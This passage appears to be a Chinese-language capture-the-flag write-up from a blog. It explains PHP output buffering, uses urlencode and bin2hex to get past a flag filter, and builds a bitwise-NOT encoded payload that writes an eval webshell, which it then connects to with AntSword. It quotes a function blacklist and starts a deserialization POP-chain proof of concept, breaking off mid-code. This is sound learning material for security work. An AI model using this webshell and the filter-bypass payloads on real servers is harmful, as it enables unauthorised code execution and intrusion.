打开输出控制缓冲</p><p>ob_start(callable $callback)，内部缓冲区的内容可以用 <a href="https://www.php.net/manual/zh/function.ob-get-contents.php">ob_get_contents()</a> 复制到字符串变量中。想要输出存储在内部缓冲区中的内容，使用 <a href="https://www.php.net/manual/zh/function.ob-end-flush.php">ob_end_flush()</a> 函数。另外，使用 <a href="https://www.php.net/manual/zh/function.ob-end-clean.php">ob_end_clean()</a> 函数会静默丢弃掉缓冲区的内容。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs wiki">警告<br>当有正在调用的回调函数时，一些 Web 服务器（例如 Apache）会改变脚本的工作目录。可以在回调函数中再把它改回来，例如 chdir(dirname($_SERVER[&#x27;SCRIPT_FILENAME&#x27;]))。#也就是line182<br></code></pre></td></tr></table></figure><p>参数：</p><p>$callback：</p><p>可选参数 <code>callback</code> 函数可以被指定。此函数把一个字符串当作参数并返回一个字符串。当输出缓冲区被（<a href="https://www.php.net/manual/zh/function.ob-flush.php">ob_flush()</a>、<a href="https://www.php.net/manual/zh/function.ob-clean.php">ob_clean()</a> 或者相似的函数）冲刷（送出）或者被清洗的时候；或者在请求结束之际输出缓冲区内容被冲刷到浏览器的时候该函数将会被调用。当调用 <code>callback</code> 时，它将收到输出缓冲区的内容作为参数并预期返回一个新的输出缓冲区作为结果，这个新返回的输出缓冲区内容将被送到浏览器。如果这个 <code>callback</code> 不是一个可以调用的函数，此函数会返回 **<code>false</code>**。如果 <code>callback</code> 返回 <strong><code>false</code></strong> ，其原来的输入内容被直接送到浏览器。这个参数 <code>callback</code> 可以通过直接给一个 <strong><code>null</code></strong> 值而避开。</p><p>buffer：</p><p>输出缓冲区中的内容。</p><p>以下为用户自定义回调函数的例子：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs php+HTML">&lt;?php<br><br>function callback($buffer)#不理解上面ob_start(&quot;cacheCtrl&quot;)的可以结合这个看下，cacheCtrl的参数buffer和callback的参数buffer<br>&#123;<br>  // replace all the apples with oranges<br>  return (str_replace(&quot;apples&quot;, &quot;oranges&quot;, $buffer));<br>&#125;<br><br>ob_start(&quot;callback&quot;);<br><br>?&gt;<br>&lt;html&gt;<br>&lt;body&gt;<br>&lt;p&gt;It&#x27;s like comparing apples to oranges.&lt;/p&gt;<br>&lt;/body&gt;<br>&lt;/html&gt;<br>&lt;?php<br><br>ob_end_flush();<br><br>?&gt;<br></code></pre></td></tr></table></figure><p>会输出</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">html</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">body</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">p</span>&gt;</span>It&#x27;s like comparing oranges to oranges.<span class="hljs-tag">&lt;/<span class="hljs-name">p</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">html</span>&gt;</span><br></code></pre></td></tr></table></figure><p>“当调用 <code>callback</code> 时，它将收到输出缓冲区的内容作为参数并预期返回一个新的输出缓冲区作为结果，这个新返回的输出缓冲区内容将被送到浏览器”</p><p>也就是说，本题原本的$buffer为真正的flag，但是经过filterFunc的洗礼之后变成了fakeflag，调用cacheCtrl之后替换掉了原先位于缓冲区的真正的flag，将被送到浏览器。</p><p><a href="https://www.php.net/manual/zh/function.ob-end-flush.php">ob_end_flush()</a> - 冲刷出（送出）输出缓冲区内容并关闭缓冲区：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>) </span>&#123;<span class="hljs-comment">#line92</span><br>     @<span class="hljs-title function_ invoke__">ob_end_flush</span>();<br>&#125;<br></code></pre></td></tr></table></figure><p>最终fakeflag从缓冲区被推向浏览器显示出来。</p><p>输出fakeflag的机制弄清楚了，根据<code>fileterOriginFlag()</code>的内容，原先buffer中的”ROIS{.*}”会被替换掉，那么只要我的输出中不包含这样的结构不就可以了吗。改变结构的想法无非就是编码、逆序。这里查看最上面的</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$rce_blacklist</span> = <span class="hljs-string">&quot;/(var_dump|str_rot13|serialize|base64_encode|base64_decode|strrev|eval|assert|file_put_contents|fwrite|curl_exec|passthru|exec|dl|readlink|popepassthru|preg_replace|create_function|array_map|call_user_func|call_user_func_array|array_filter|usort|stream_socket_server|pcntl_exec|passthru|exec|system|chroot|scandir|chgrp|chown|shell_exec|proc_open|proc_get_status|popen|ini_alter|ini_restore|ini_set|LD_PRELOAD|ini_alter|ini_restore|ini_set)\s*\(/i&quot;</span>;<br></code></pre></td></tr></table></figure><p>发现base64编码被ban，逆序函数<code>strrev()</code>也被ban，<code>md5()</code>是没被ban但是总没有人敢手撕那坨玩意吧（</p><p><code>urlencode()</code>没被ban，已知flag中包含”{}”，url编码之后大括号形式改变。</p><p><img src="/2023/02/10/ROIS/image-20230409020606351.png"></p><p>url解码得到真正的flag。<code>bin2hex()</code>函数也没被ban，能将结果变为16进制。</p><p><img src="/2023/02/10/ROIS/image-20230409020801312.png"></p><p>hex解码后得到真正的flag。</p><p>那么如果不从浏览器中显示，而是直接读取文件呢？这样一来就不会有通过浏览器将fakeflag显示出来了，即使缓冲区被修改了也不会通过浏览器被读取因为是直接读取文件。没错也就是上马实现rce后用蚁剑连接。</p><p>但是在层层的过滤之下怎么getshell呢？这时候就要有请无数字字母rce了</p><p>学习了<a href="http://arsenetang.com/2021/07/28/RCE%E7%AF%87%E4%B9%8B%E6%97%A0%E5%AD%97%E6%AF%8D%E6%95%B0%E5%AD%97rce/">这篇文章</a>，用了大佬的无字母数字rce：</p><p><img src="/2023/02/10/ROIS/image-20230409154816719.png"></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">(~(%<span class="hljs-number">99</span>%<span class="hljs-number">96</span>%<span class="hljs-number">93</span>%<span class="hljs-number">9</span>A%A0%<span class="hljs-number">8</span>F%<span class="hljs-number">8</span>A%<span class="hljs-number">8</span>B%A0%<span class="hljs-number">9</span>C%<span class="hljs-number">90</span>%<span class="hljs-number">91</span>%<span class="hljs-number">8</span>B%<span class="hljs-number">9</span>A%<span class="hljs-number">91</span>%<span class="hljs-number">8</span>B%<span class="hljs-number">8</span>C))(~(%CB%D1%<span class="hljs-number">8</span>F%<span class="hljs-number">97</span>%<span class="hljs-number">8</span>F),~(%C3%C0%<span class="hljs-number">8</span>F%<span class="hljs-number">97</span>%<span class="hljs-number">8</span>F%DF%<span class="hljs-number">9</span>A%<span class="hljs-number">89</span>%<span class="hljs-number">9</span>E%<span class="hljs-number">93</span>%D7%DB%A0%AF%B0%AC%AB%A4%CE%A2%D6%C4));<br></code></pre></td></tr></table></figure><p>自己动手操作一遍：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$a</span>=<span class="hljs-string">&quot;file_put_contents&quot;</span>;<br><span class="hljs-variable">$b</span>=~<span class="hljs-variable">$a</span>;<br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">urlencode</span>(<span class="hljs-variable">$b</span>);<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;\n&quot;</span>;<br><span class="hljs-variable">$file</span>=<span class="hljs-string">&quot;233.php&quot;</span>;<br><span class="hljs-variable">$c</span>=~<span class="hljs-variable">$file</span>;<br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">urlencode</span>(<span class="hljs-variable">$c</span>);<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;\n&quot;</span>;<br><span class="hljs-variable">$content</span>=<span class="hljs-string">&quot;&lt;?php eval(\$_POST[1]);&quot;</span>;<br><span class="hljs-variable">$d</span>=~<span class="hljs-variable">$content</span>;<br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">urlencode</span>(<span class="hljs-variable">$d</span>);<br><span class="hljs-comment">#output:</span><br><span class="hljs-comment">#%99%96%93%9A%A0%8F%8A%8B%A0%9C%90%91%8B%9A%91%8B%8C</span><br><span class="hljs-comment">#%CD%CC%CC%D1%8F%97%8F</span><br><span class="hljs-comment">#%C3%C0%8F%97%8F%DF%9A%89%9E%93%D7%DB%A0%AF%B0%AC%AB%A4%CE%A2%D6%C4</span><br></code></pre></td></tr></table></figure><p>因此rce应为</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">cmd=(~(%<span class="hljs-number">99</span>%<span class="hljs-number">96</span>%<span class="hljs-number">93</span>%<span class="hljs-number">9</span>A%A0%<span class="hljs-number">8</span>F%<span class="hljs-number">8</span>A%<span class="hljs-number">8</span>B%A0%<span class="hljs-number">9</span>C%<span class="hljs-number">90</span>%<span class="hljs-number">91</span>%<span class="hljs-number">8</span>B%<span class="hljs-number">9</span>A%<span class="hljs-number">91</span>%<span class="hljs-number">8</span>B%<span class="hljs-number">8</span>C))(~(%CD%CC%CC%D1%<span class="hljs-number">8</span>F%<span class="hljs-number">97</span>%<span class="hljs-number">8</span>F),~(%C3%C0%<span class="hljs-number">8</span>F%<span class="hljs-number">97</span>%<span class="hljs-number">8</span>F%DF%<span class="hljs-number">9</span>A%<span class="hljs-number">89</span>%<span class="hljs-number">9</span>E%<span class="hljs-number">93</span>%D7%DB%A0%AF%B0%AC%AB%A4%CE%A2%D6%C4));<br></code></pre></td></tr></table></figure><p>cmd传入：</p><p><img src="/2023/02/10/ROIS/image-20230409161554426.png"></p><p>发现已经写入当前目录了(如果没有写入说明当前目录对用户没开放写入权限，就要写入&#x2F;tmp目录)</p><p><img src="/2023/02/10/ROIS/image-20230409161615101.png"></p><p>木马上完了，打开蚁剑，测试连接，连接成功。</p><p><img src="/2023/02/10/ROIS/image-20230409161705804.png"></p><p>读取根目录下的flag：</p><p><img src="/2023/02/10/ROIS/image-20230409161802859.png"></p><p>附：</p><ol><li><p>缓冲(buffer)与缓存(cache)：</p><ul><li><p>缓冲：为提高内存硬盘或其他I&#x2F;O设备之间数据交换的效率而设计，当创建一个buffer对象时，会先创建一个缓冲区数组，然后我们读一个文件时，会先从硬盘中读到缓冲区，待缓冲区满了再进行传送（比如要使用echo输出，会将输出先存入缓存区中）。</p></li><li><p>缓存：为提高cpu和内存之间的数据交换效率而设计。当计算机执行程序时，数据与地址管理部件会 预测 可能要用到的数据和指令, 并将这些数据和指令预先从内存中读出送到Cache. 一旦需要时，先检查Cache，若有就从Cache中读取，若无再访问内存。</p></li><li><p>buffer侧重写，cache侧重读。</p></li><li><p>举例：</p></li><li><p>buffer：倒垃圾不会一有垃圾就直接跑去垃圾站倒，而是先把垃圾扔垃圾桶里，等垃圾桶满了再去垃圾场倒。垃圾桶就是这个缓冲容器。</p></li><li><p>cache：缓存视频。</p></li><li><p>php中的输出流程：</p><p>php输出语句&#x2F;函数-&gt;php缓冲区配置-&gt;web服务器缓冲区配置-&gt;浏览器缓冲区-&gt;浏览器显示</p></li><li><p>php常用函数：</p><ul><li><p>获取buffer中的内容：<code>ob_get_contents()</code>，使用案例：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">ob_start</span>();<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;hello world&#x27;</span>;<br><span class="hljs-variable">$buffer</span> = <span class="hljs-title function_ invoke__">ob_get_contents</span>();<br><span class="hljs-title function_ invoke__">file_put_contents</span>(<span class="hljs-string">&#x27;log.txt&#x27;</span>,<span class="hljs-variable">$buffer</span>);<br><span class="hljs-meta">?&gt;</span><br><span class="hljs-comment">#浏览器中显示&quot;hello world&quot;，log.txt中写入&quot;hello world&quot;</span><br></code></pre></td></tr></table></figure></li><li><p>清空buffer：<code>ob_clean()</code>，使用案例：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">ob_start</span>();<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;hello world&#x27;</span>;<br><span class="hljs-variable">$buffer</span> = <span class="hljs-title function_ invoke__">ob_get_contents</span>();<br><span class="hljs-title function_ invoke__">file_put_contents</span>(<span class="hljs-string">&#x27;log.txt&#x27;</span>,<span class="hljs-variable">$buffer</span>);<br><span class="hljs-title function_ invoke__">ob_clean</span>();<br><span class="hljs-meta">?&gt;</span><br><span class="hljs-comment">#浏览器中不显示&quot;hello world&quot;，而log.txt储存了&quot;hello world&quot;</span><br></code></pre></td></tr></table></figure></li><li><p>ob_get_length()   - 返回输出缓冲区的长度</p></li><li><p>ob_get_level()    - 返回输出缓冲区的嵌套级别</p></li><li><p>ob_get_status()   - 返回输出缓冲区的状态（数组形式返回，默认返回最顶层，参数为true时返回所有）</p></li><li><p>ob_end_clean()    - 清空（擦除）缓冲区并关闭输出缓冲</p></li><li><p>ob_get_flush()     - 以字符串返回输出缓冲区内容并关闭缓冲</p></li><li><p>ob_end_flush()    - 冲刷出（送出）输出缓冲区内容缓冲并关闭输出缓冲</p></li></ul></li></ul></li><li><p>php ob_start()中的一个小小思考：</p></li></ol><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br>    <br>    <span class="hljs-title function_ invoke__">ob_start</span>();              <span class="hljs-comment">// start output buffer 1</span><br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;a&quot;</span>;                <span class="hljs-comment">// fill ob1</span><br>        <br>        <span class="hljs-title function_ invoke__">ob_start</span>();              <span class="hljs-comment">// start output buffer 2</span><br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;b&quot;</span>;                <span class="hljs-comment">// fill ob2</span><br>        <span class="hljs-variable">$s1</span> = <span class="hljs-title function_ invoke__">ob_get_contents</span>(); <span class="hljs-comment">// read ob2 (&quot;b&quot;)</span><br>        <span class="hljs-title function_ invoke__">ob_end_flush</span>();          <span class="hljs-comment">// flush ob2 to ob1</span><br>        <br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;c&quot;</span>;                <span class="hljs-comment">// continue filling ob1</span><br>    <span class="hljs-variable">$s2</span> = <span class="hljs-title function_ invoke__">ob_get_contents</span>(); <span class="hljs-comment">// read ob1 (&quot;a&quot; . &quot;b&quot; . &quot;c&quot;)</span><br>    <span class="hljs-title function_ invoke__">ob_end_flush</span>();          <span class="hljs-comment">// flush ob1 to browser</span><br>    <br>    <span class="hljs-comment">// echoes &quot;b&quot; followed by &quot;abc&quot;, as supposed to:</span><br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;HR&gt;<span class="hljs-subst">$s1</span>&lt;HR&gt;<span class="hljs-subst">$s2</span>&lt;HR&gt;&quot;</span>;<br>    <br><span class="hljs-meta">?&gt;</span><br>    <br> <span class="hljs-comment">#输出</span><br></code></pre></td></tr></table></figure><p>3.php中系统命令执行函数：</p><table><thead><tr><th>函数</th><th>作用</th><th>使用</th></tr></thead><tbody><tr><td>system()</td><td>执行系统命令，输出执行结果</td><td>system(“ls”)</td></tr><tr><td>exec()</td><td>执行系统命令，不输出执行结果，返回执行结果数组</td><td>exec(‘ls’,$result)</td></tr><tr><td>passthru()</td><td>执行系统命令，输出执行结果(支持二进制)</td><td>passthru(“ls”)</td></tr><tr><td>shell_exec()</td><td>执行系统命令，不输出结果，返回执行结果字符串</td><td>shell_exec(“ls”)</td></tr><tr><td>popen</td><td>执行系统命令，不输出结果，返回一个资源类型</td><td>popen(“ls”,’r’)</td></tr><tr><td>&#96;&#96;</td><td>执行系统命令，不输出结果，返回执行结果字符串</td><td><code>ls</code></td></tr></tbody></table><p>4.无数字字母rce相关文章：</p><ul><li><a href="https://blog.csdn.net/qq_61955196/article/details/127932968">ctfshow大挑战rce篇</a></li><li><a href="http://arsenetang.com/2021/07/28/RCE%E7%AF%87%E4%B9%8B%E6%97%A0%E5%AD%97%E6%AF%8D%E6%95%B0%E5%AD%97rce/">Arsene.Tang的RCE篇之无数字字母rce</a></li><li><a href="https://potatowo233.github.io/2023/04/09/%E6%97%A0%E5%AD%97%E6%AF%8D%E6%95%B0%E5%AD%97RCE/">Potat0w0的（</a></li></ul><hr><h3 id="babyphp"><a href="#babyphp" class="headerlink" title="babyphp"></a>babyphp</h3><p>这题综合性比较强，考察了挺多方面的东西的（大哭</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">backdoor</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-variable">$a</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&quot;a&quot;</span>];<br>    <span class="hljs-variable">$b</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&quot;b&quot;</span>];<br>    <span class="hljs-variable">$d</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&quot;d&quot;</span>];<br>    <span class="hljs-variable">$e</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&quot;e&quot;</span>];<br>    <span class="hljs-variable">$f</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&quot;f&quot;</span>];<br>    <span class="hljs-variable">$g</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&quot;g&quot;</span>];<br>    <span class="hljs-variable">$class</span> = <span class="hljs-keyword">new</span> <span class="hljs-variable">$a</span>(<span class="hljs-variable">$b</span>);<br>    <span class="hljs-variable">$str1</span> = <span class="hljs-title function_ invoke__">substr</span>(<span class="hljs-variable">$class</span>, <span class="hljs-variable">$d</span>, <span class="hljs-variable">$e</span>);<br>    <span class="hljs-variable">$str2</span> = <span class="hljs-title function_ invoke__">substr</span>(<span class="hljs-variable">$class</span>, <span class="hljs-variable">$f</span>, <span class="hljs-variable">$g</span>);<br>    <span class="hljs-variable">$str1</span>(<span class="hljs-variable">$str2</span>);<br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">popko</span></span><br><span class="hljs-class"></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$left</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$right</span>;<br><br><span class="hljs-comment">//    public function __destruct()</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__call</span>(<span class="hljs-params"><span class="hljs-variable">$method</span>,<span class="hljs-variable">$args</span></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">if</span> ((<span class="hljs-variable language_">$this</span>-&gt;left != <span class="hljs-variable language_">$this</span>-&gt;right) &amp;&amp; (<span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$this</span>-&gt;left) === <span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$this</span>-&gt;right)) &amp;&amp; (<span class="hljs-title function_ invoke__">sha1</span>(<span class="hljs-variable">$this</span>-&gt;left) === <span class="hljs-title function_ invoke__">sha1</span>(<span class="hljs-variable">$this</span>-&gt;right))) &#123;<br>            <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;backdoor is here&quot;</span>;<br>            <span class="hljs-title function_ invoke__">backdoor</span>();<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__wakeup</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;left = <span class="hljs-string">&quot;&quot;</span>;<br>        <span class="hljs-variable language_">$this</span>-&gt;right = <span class="hljs-string">&quot;&quot;</span>;<br>    &#125;<br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">pipimi</span></span><br><span class="hljs-class"></span>&#123;<br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-variable language_">$this</span>-&gt;a-&gt;<span class="hljs-title function_ invoke__">a</span>();<br>    &#125;<br>&#125;<br><br><span class="hljs-variable">$c</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&quot;c&quot;</span>];<br><span class="hljs-keyword">if</span> (<span class="hljs-variable">$c</span> != <span class="hljs-literal">null</span>) &#123;<br>    <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">strstr</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&quot;c&quot;</span>], <span class="hljs-string">&quot;popko&quot;</span>) === <span class="hljs-literal">false</span>) &#123;<br>        <span class="hljs-title function_ invoke__">unserialize</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&quot;c&quot;</span>]);<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;:)&quot;</span>;<br>    &#125;<br>&#125; <span class="hljs-keyword">else</span> &#123;<br>    <span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br>&#125;<br></code></pre></td></tr></table></figure><p>开局直接一波代码审计。先看后端代码，是反序列化，很明显是希望执行backdoor()后门来进行rce，执行backdoor()方法就要执行popko类里的__call()方法，执行popko里的__call()方法就要调用一个未定义的方法，再往下看发现pipimi类中a类和a方法均未定义，pop链就比较明显了：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">pipimi::<span class="hljs-title function_ invoke__">__destruct</span>() =&gt; popko::<span class="hljs-title function_ invoke__">__call</span>() =&gt; <span class="hljs-title function_ invoke__">backdoor</span>()<br></code></pre></td></tr></table></figure><p>再看__call()方法下的规则</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">if</span> ((<span class="hljs-variable language_">$this</span>-&gt;left != <span class="hljs-variable language_">$this</span>-&gt;right) &amp;&amp; (<span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$this</span>-&gt;left) === <span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$this</span>-&gt;right)) &amp;&amp; (<span class="hljs-title function_ invoke__">sha1</span>(<span class="hljs-variable">$this</span>-&gt;left) === <span class="hljs-title function_ invoke__">sha1</span>(<span class="hljs-variable">$this</span>-&gt;right))) &#123;<br>            <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;backdoor is here&quot;</span>;<br>            <span class="hljs-title function_ invoke__">backdoor</span>();<br>        &#125;<br></code></pre></td></tr></table></figure><p>要求popko类中的$left和$right不相同但是md5编码和sha1编码强比较相同，因此popko-&gt;left和popko-&gt;right均为数组</p><p>编写poc：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">backdoor</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-title function_ invoke__">system</span>(<span class="hljs-string">&quot;calc.exe&quot;</span>);<br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">popko</span></span><br><span class="hljs-class"></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$left</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$right</span>;<br><br><span class="hljs-comment">//    public function __destruct()</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__call</span>(<span class="hljs-params"><span class="hljs-variable">$method</span>,<span class="hljs-variable">$args</span></span>)</span><br><span class="hljs-function">    </span>&#123;<br>            <span class="hljs-title function_ invoke__">backdoor</span>();<br>    &#125;<br><br>    <span class="hljs-comment">#public function __wakeup()</span><br>    <span class="hljs-comment">#&#123;</span><br>    <span class="hljs-comment">#    $this-&gt;left = &quot;&quot;;</span><br>    <span class="hljs-comment">#    $this-&gt;right = &quot;&quot;;</span><br>    <span class="hljs-comment">#&#125;</span><br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">pipimi</span></span><br><span class="hljs-class"></span>&#123;<br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-variable language_">$this</span>-&gt;a-&gt;<span class="hljs-title function_ invoke__">a</span>();<br>    &#125;<br>&#125;<br><br><br><span class="hljs-variable">$pop</span>=<span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">popko</span>();<br><span class="hljs-variable">$pop</span>-&gt;left=[<span class="hljs-number">1</span>];<br><span class="hljs-variable">$pop</span>-&gt;right=[<span class="hljs-number">2</span>];<br><span 